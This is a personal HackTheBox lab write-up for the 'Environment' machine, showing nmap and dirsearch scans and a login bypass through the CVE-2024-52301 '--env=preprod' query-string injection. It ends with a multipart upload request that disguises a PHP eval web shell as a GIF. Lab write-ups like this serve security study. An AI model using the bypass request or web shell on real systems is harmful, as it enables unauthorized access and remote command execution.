# Environment HackTheBox

# IP
- 10.10.11.67

# Result from the nmap
```
lily@fedora:~/projects/HackTheBox-Writeups/Environment$ nmap 10.10.11.67 -sV -A
Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-02 20:26 EDT
Nmap scan report for 10.10.11.67
Host is up (0.026s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://environment.htb
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# dirsearch
- chose on the factor that I had never used it before and saw it in a youtube video
- ```dirsearch -u http://10.10.11.67```
- Used a different command but eventually got
```
❯ dirsearch -u http://environment.htb 

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                
 (_||| _) (/_(_|| (_| )                                                                                                                         
                                                                                                                                                
Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289

Target: http://environment.htb/

[07:23:08] Scanning:                                                                                                                            
[07:23:23] 403 - 555B - /admin/.config                                    
[07:23:23] 403 - 555B - /admin/.htaccess
[07:23:39] 403 - 555B - /administrator/.htaccess                          
[07:23:43] 403 - 555B - /admpar/.ftppass                                  
[07:23:43] 403 - 555B - /admrev/.ftppass
[07:23:46] 403 - 555B - /app/.htaccess                                    
[07:23:52] 403 - 555B - /bitrix/.settings.bak                             
[07:23:52] 403 - 555B - /bitrix/.settings
[07:23:52] 403 - 555B - /bitrix/.settings.php.bak                         
[07:23:54] 301 - 169B - /build  ->  http://environment.htb/build/         
[07:23:54] 403 - 555B - /build/                                           
[07:24:15] 403 - 555B - /ext/.deps                                        
[07:24:15] 200 - 0B - /favicon.ico                                      
[07:24:26] 200 - 4KB - /index.php                                        
[07:24:26] 200 - 2KB - /index.php/login/                                 
[07:24:31] 403 - 555B - /lib/flex/varien/.project                         
[07:24:31] 403 - 555B - /lib/flex/uploader/.actionScriptProperties
[07:24:31] 403 - 555B - /lib/flex/varien/.flexLibProperties
[07:24:31] 403 - 555B - /lib/flex/varien/.actionScriptProperties
[07:24:31] 403 - 555B - /lib/flex/uploader/.flexProperties
[07:24:31] 403 - 555B - /lib/flex/uploader/.project
[07:24:31] 403 - 555B - /lib/flex/uploader/.settings
[07:24:31] 403 - 555B - /lib/flex/varien/.settings
[07:24:34] 200 - 2KB - /login                                            
[07:24:34] 200 - 2KB - /login/                                           
[07:24:35] 302 - 358B - /logout/  ->  http://environment.htb/login        
[07:24:35] 302 - 358B - /logout  ->  http://environment.htb/login         
[07:24:36] 403 - 555B - /mailer/.env                                      
[07:25:01] 403 - 555B - /resources/sass/.sass-cache/                      
[07:25:01] 403 - 555B - /resources/.arch-internal-preview.css
[07:25:02] 200 - 24B - /robots.txt                                       
[07:25:12] 301 - 169B - /storage  ->  http://environment.htb/storage/     
[07:25:12] 403 - 555B - /storage/
[07:25:19] 403 - 555B - /twitter/.env                                     
[07:25:21] 405 - 244KB - /upload/                                          
[07:25:22] 405 - 244KB - /upload                                           
[07:25:24] 403 - 555B - /vendor/                                          
                                                                             
Task Completed    
```

# Env bypass
- try the login page and grab the package sent and then there is a error message directly brought out
```
POST /login HTTP/1.1
Host: environment.htb

_token=JNCSO9ry4XvsQhVOhorOAtASyt4bQrqZAvy9paUx&email=a%40a.c&password=123
```
- important logic that caught my eye
```
if($remember == 'False') {
        $keep_loggedin = False;
    } elseif ($remember == 'True') {
        $keep_loggedin = True;
    }
```
- then eventually try
```
POST /login HTTP/1.1
Host: environment.htb

_token=JNCSO9ry4XvsQhVOhorOAtASyt4bQrqZAvy9paUx&email=a%40a.c&password=123&remember=111
```

- provide the Image here 

- the environment is in "preprod", and can autologin as ```user_id = 1``` and the user can jump to the management background page

- https://www.cybersecurity-help.cz/vdb/SB20241112127
- https://github.com/Nyamort/CVE-2024-52301

- You just need to enter ```GET``` Parameters can be bypassed

```
POST /login?--env=preprod HTTP/1.1
Host: environment.htb

_token=JNCSO9ry4XvsQhVOhorOAtASyt4bQrqZAvy9paUx&email=a%40a.c&password=123&remember=True
```

- using this I can find a trojan that I can upload to the platform to use to pop a shell

```
-----------------------------60487661513624885101007722530
Content-Disposition: form-data; name="upload"; filename="shell.phtml"
Content-Type: image/jpg

GIF89a
<?php eval($_GET["cmd"]);?>

-----------------------------60487661513624885101007722530--
```

